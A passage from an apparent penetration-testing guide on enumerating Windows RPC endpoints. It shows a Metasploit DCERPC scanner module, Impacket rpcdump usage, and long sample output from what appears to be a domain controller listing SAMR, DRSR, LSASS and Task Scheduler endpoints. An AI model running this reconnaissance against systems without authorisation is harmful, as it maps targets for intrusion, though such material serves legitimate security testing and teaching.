<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p>We can use <strong>rpcdump</strong> from <strong>Impacket</strong> to dump the RPC information. This tool can communicate over Port 135,139 and 445. The rpcdump tool from rpctools can also extract information from Port 593.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies
</span><span class='line'>
</span><span class='line'>usage: rpcdump.py [-h] [-debug] [-hashes LMHASH:NTHASH]
</span><span class='line'>                  target [{445/SMB,135/TCP,139/SMB}]
</span><span class='line'>
</span><span class='line'>Dumps the remote RPC endpoints information</span></code></pre></td></tr></table></div></figure>


<p>Sample Output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
<span class='line-number'>310</span>
<span class='line-number'>311</span>
<span class='line-number'>312</span>
<span class='line-number'>313</span>
<span class='line-number'>314</span>
<span class='line-number'>315</span>
<span class='line-number'>316</span>
<span class='line-number'>317</span>
<span class='line-number'>318</span>
<span class='line-number'>319</span>
<span class='line-number'>320</span>
<span class='line-number'>321</span>
<span class='line-number'>322</span>
<span class='line-number'>323</span>
<span class='line-number'>324</span>
<span class='line-number'>325</span>
<span class='line-number'>326</span>
<span class='line-number'>327</span>
<span class='line-number'>328</span>
<span class='line-number'>329</span>
<span class='line-number'>330</span>
<span class='line-number'>331</span>
<span class='line-number'>332</span>
<span class='line-number'>333</span>
<span class='line-number'>334</span>
<span class='line-number'>335</span>
<span class='line-number'>336</span>
<span class='line-number'>337</span>
<span class='line-number'>338</span>
<span class='line-number'>339</span>
<span class='line-number'>340</span>
<span class='line-number'>341</span>
<span class='line-number'>342</span>
<span class='line-number'>343</span>
<span class='line-number'>344</span>
<span class='line-number'>345</span>
<span class='line-number'>346</span>
<span class='line-number'>347</span>
<span class='line-number'>348</span>
<span class='line-number'>349</span>
<span class='line-number'>350</span>
<span class='line-number'>351</span>
<span class='line-number'>352</span>
<span class='line-number'>353</span>
<span class='line-number'>354</span>
<span class='line-number'>355</span>
<span class='line-number'>356</span>
<span class='line-number'>357</span>
<span class='line-number'>358</span>
<span class='line-number'>359</span>
<span class='line-number'>360</span>
<span class='line-number'>361</span>
<span class='line-number'>362</span>
<span class='line-number'>363</span>
<span class='line-number'>364</span>
<span class='line-number'>365</span>
<span class='line-number'>366</span>
<span class='line-number'>367</span>
<span class='line-number'>368</span>
<span class='line-number'>369</span>
<span class='line-number'>370</span>
<span class='line-number'>371</span>
<span class='line-number'>372</span>
<span class='line-number'>373</span>
<span class='line-number'>374</span>
<span class='line-number'>375</span>
<span class='line-number'>376</span>
<span class='line-number'>377</span>
<span class='line-number'>378</span>
<span class='line-number'>379</span>
<span class='line-number'>380</span>
<span class='line-number'>381</span>
<span class='line-number'>382</span>
<span class='line-number'>383</span>
<span class='line-number'>384</span>
<span class='line-number'>385</span>
<span class='line-number'>386</span>
<span class='line-number'>387</span>
<span class='line-number'>388</span>
<span class='line-number'>389</span>
<span class='line-number'>390</span>
<span class='line-number'>391</span>
<span class='line-number'>392</span>
<span class='line-number'>393</span>
<span class='line-number'>394</span>
<span class='line-number'>395</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpcdump.py 10.10.xx.xx
</span><span class='line'>Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies
</span><span class='line'>
</span><span class='line'>[*] Retrieving endpoint list from 10.10.xx.xx
</span><span class='line'>[*] Trying protocol 135/TCP...
</span><span class='line'>Protocol: N/A     
</span><span class='line'>Provider: iphlpsvc.dll 
</span><span class='line'>UUID    : 552D076A-CB29-4E44-8B6A-D15E59E2C0AF v1.0 IP Transition Configuration endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\srvsvc]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49154]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: schedsvc.dll 
</span><span class='line'>UUID    : 0A74EF1C-41A4-4E06-83AE-DC74FB1CDD53 v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: nsisvc.dll 
</span><span class='line'>UUID    : 7EA70BCF-48AF-4F6A-8968-6A440754D5FA v1.0 NSI server endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-37912a0de47813b4b3]
</span><span class='line'>          ncalrpc:[OLE6ECE1F6A513142EC99562256F849]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-CMPO]: MSDTC Connection Manager: 
</span><span class='line'>Provider: msdtcprx.dll 
</span><span class='line'>UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-316e773cde064c1ede]
</span><span class='line'>          ncalrpc:[LRPC-316e773cde064c1ede]
</span><span class='line'>          ncalrpc:[LRPC-316e773cde064c1ede]
</span><span class='line'>          ncalrpc:[LRPC-316e773cde064c1ede]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: dhcpcsvc6.dll 
</span><span class='line'>UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D6 v1.0 DHCPv6 Client LRPC Endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[dhcpcsvc6]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49153]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\eventlog]
</span><span class='line'>          ncalrpc:[eventlog]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: nrpsrv.dll 
</span><span class='line'>UUID    : 30ADC50C-5CBC-46CE-9A0E-91914789E23C v1.0 NRP server endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49153]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\eventlog]
</span><span class='line'>          ncalrpc:[eventlog]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-RSP]: Remote Shutdown Protocol 
</span><span class='line'>Provider: wininit.exe 
</span><span class='line'>UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49152]
</span><span class='line'>          ncalrpc:[WindowsShutdown]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\InitShutdown]
</span><span class='line'>          ncalrpc:[WMsgKRpc07EB30]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: authui.dll 
</span><span class='line'>UUID    : 24019106-A203-4642-B88D-82DAE9158929 v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-21f4d30ba4239e8f6e]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: gpsvc.dll 
</span><span class='line'>UUID    : 2EB08E3E-639F-4FBA-97B1-14F878961076 v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: BFE.DLL 
</span><span class='line'>UUID    : DD490425-5325-4565-B774-7E27D6C09C24 v1.0 Base Firewall Engine API
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-5409763072e46c4586]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
</span><span class='line'>Provider: schedsvc.dll 
</span><span class='line'>UUID    : 86D35949-83C9-4044-B424-DB363231FD0C v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49154]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: ntfrs.exe 
</span><span class='line'>UUID    : A00C021C-2BE2-11D2-B678-0000F87A8F8E v1.0 PERFMON SERVICE
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-77115559ab3225edd1]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49161]
</span><span class='line'>          ncalrpc:[OLE7A4789AA2E3C4A59AC310EF3185A]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-DRSR]: Directory Replication Service (DRS) Remote Protocol 
</span><span class='line'>Provider: ntdsai.dll 
</span><span class='line'>UUID    : E3514235-4B06-11D1-AB04-00C04FC2DCD2 v4.0 MS NT Directory DRS Interface
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_http:10.10.xx.xx[49157]
</span><span class='line'>          ncalrpc:[NTDS_LPC]
</span><span class='line'>          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49155]
</span><span class='line'>          ncalrpc:[samss lpc]
</span><span class='line'>          ncalrpc:[dsrole]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\protected_storage]
</span><span class='line'>          ncalrpc:[protected_storage]
</span><span class='line'>          ncalrpc:[lsasspirpc]
</span><span class='line'>          ncalrpc:[lsapolicylookup]
</span><span class='line'>          ncalrpc:[LSARPC_ENDPOINT]
</span><span class='line'>          ncalrpc:[securityevent]
</span><span class='line'>          ncalrpc:[audit]
</span><span class='line'>          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\lsass]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
</span><span class='line'>Provider: taskcomp.dll 
</span><span class='line'>UUID    : 378E52B0-C0A9-11CF-822D-00AA0051E40F v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-DNSP]: Domain Name Service (DNS) Server Management 
</span><span class='line'>Provider: dns.exe 
</span><span class='line'>UUID    : 50ABC2A4-574D-40B3-9D66-EE4FD5FBA076 v5.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49166]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol 
</span><span class='line'>Provider: spoolsv.exe 
</span><span class='line'>UUID    : 0B6EDBFA-4A24-4FC6-8A23-942B1ECA65D1 v1.0 Spooler function endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[spoolss]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
</span><span class='line'>Provider: taskcomp.dll 
</span><span class='line'>UUID    : 1FF70682-0A51-30E8-076D-740BE8CEE98B v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: spoolsv.exe 
</span><span class='line'>UUID    : 4A452661-8290-4B36-8FBE-7F4093A94978 v1.0 Spooler function endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[spoolss]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: keyiso.dll 
</span><span class='line'>UUID    : B25A52BF-E5DD-4F4A-AEA6-8CA7272A0E86 v1.0 KeyIso
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49158]
</span><span class='line'>          ncacn_http:10.10.xx.xx[49157]
</span><span class='line'>          ncalrpc:[NTDS_LPC]
</span><span class='line'>          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49155]
</span><span class='line'>          ncalrpc:[samss lpc]
</span><span class='line'>          ncalrpc:[dsrole]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\protected_storage]
</span><span class='line'>          ncalrpc:[protected_storage]
</span><span class='line'>          ncalrpc:[lsasspirpc]
</span><span class='line'>          ncalrpc:[lsapolicylookup]
</span><span class='line'>          ncalrpc:[LSARPC_ENDPOINT]
</span><span class='line'>          ncalrpc:[securityevent]
</span><span class='line'>          ncalrpc:[audit]
</span><span class='line'>          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\lsass]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-FRS1]: File Replication Service Protocol 
</span><span class='line'>Provider: ntfrs.exe 
</span><span class='line'>UUID    : D049B186-814F-11D1-9A3C-00C04FC9B232 v1.1 NtFrs API
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-77115559ab3225edd1]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49161]
</span><span class='line'>          ncalrpc:[OLE7A4789AA2E3C4A59AC310EF3185A]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol 
</span><span class='line'>Provider: samsrv.dll 
</span><span class='line'>UUID    : 12345778-1234-ABCD-EF00-0123456789AC v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49158]
</span><span class='line'>          ncacn_http:10.10.xx.xx[49157]
</span><span class='line'>          ncalrpc:[NTDS_LPC]
</span><span class='line'>          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49155]
</span><span class='line'>          ncalrpc:[samss lpc]
</span><span class='line'>          ncalrpc:[dsrole]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\protected_storage]
</span><span class='line'>          ncalrpc:[protected_storage]
</span><span class='line'>          ncalrpc:[lsasspirpc]
</span><span class='line'>          ncalrpc:[lsapolicylookup]
</span><span class='line'>          ncalrpc:[LSARPC_ENDPOINT]
</span><span class='line'>          ncalrpc:[securityevent]
</span><span class='line'>          ncalrpc:[audit]
</span><span class='line'>          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\lsass]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-SCMR]: Service Control Manager Remote Protocol 
</span><span class='line'>Provider: services.exe 
</span><span class='line'>UUID    : 367ABB81-9844-35F1-AD32-98F038001003 v2.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49168]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-FRS1]: File Replication Service Protocol 
</span><span class='line'>Provider: ntfrs.exe 
</span><span class='line'>UUID    : F5CC59B4-4264-101A-8C59-08002B2F8426 v1.1 NtFrs Service
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-77115559ab3225edd1]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49161]
</span><span class='line'>          ncalrpc:[OLE7A4789AA2E3C4A59AC310EF3185A]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: IKEEXT.DLL 
</span><span class='line'>UUID    : A398E520-D59A-4BDD-AA7A-3C1E0303A511 v1.0 IKE/Authip API
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\srvsvc]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49154]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: winlogon.exe 
</span><span class='line'>UUID    : 12E65DD8-887F-41EF-91BF-8D816C42C2E7 v1.0 Secure Desktop LRPC interface
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[WMsgKRpc0530E42]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: dhcpcsvc.dll 
</span><span class='line'>UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D5 v1.0 DHCP Client LRPC Endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[dhcpcsvc]
</span><span class='line'>          ncalrpc:[dhcpcsvc6]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49153]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\eventlog]
</span><span class='line'>          ncalrpc:[eventlog]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-ICPR]: ICertPassage Remote Protocol 
</span><span class='line'>Provider: certsrv.exe 
</span><span class='line'>UUID    : 91AE6020-9E3C-11CF-8D7C-00AA00C091BE v0.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49197]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\cert]
</span><span class='line'>          ncalrpc:[OLEC5F09EAC9DB745C58B8411EC2BA2]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol 
</span><span class='line'>Provider: spoolsv.exe 
</span><span class='line'>UUID    : AE33069B-A2A8-46EE-A235-DDFD339BE281 v1.0 Spooler base remote object endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[spoolss]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: MPSSVC.dll 
</span><span class='line'>UUID    : 2FB92682-6599-42DC-AE13-BD2CA89BD11C v1.0 Fw APIs
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-5409763072e46c4586]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: sysntfy.dll 
</span><span class='line'>UUID    : C9AC6DB5-82B7-4E55-AE8A-E464ED7B4277 v1.0 Impl friendly name
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-8e5134e25ee9203de8]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\srvsvc]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49154]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: srvsvc.dll 
</span><span class='line'>UUID    : 98716D03-89AC-44C7-BB8C-285824E51C4A v1.0 XactSrv service
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49154]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-EVEN6]: EventLog Remoting Protocol 
</span><span class='line'>Provider: wevtsvc.dll 
</span><span class='line'>UUID    : F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C v1.0 Event log TCPIP
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49153]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\eventlog]
</span><span class='line'>          ncalrpc:[eventlog]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
